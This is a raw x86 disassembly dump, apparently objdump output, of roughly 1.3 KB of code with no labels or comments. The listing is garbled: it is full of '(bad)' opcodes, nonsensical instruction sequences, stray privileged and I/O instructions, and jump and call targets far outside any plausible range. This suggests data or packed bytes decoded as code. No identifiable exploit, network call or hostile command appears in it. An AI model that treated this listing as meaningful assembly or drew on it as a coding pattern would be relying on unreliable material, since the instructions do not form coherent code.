  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
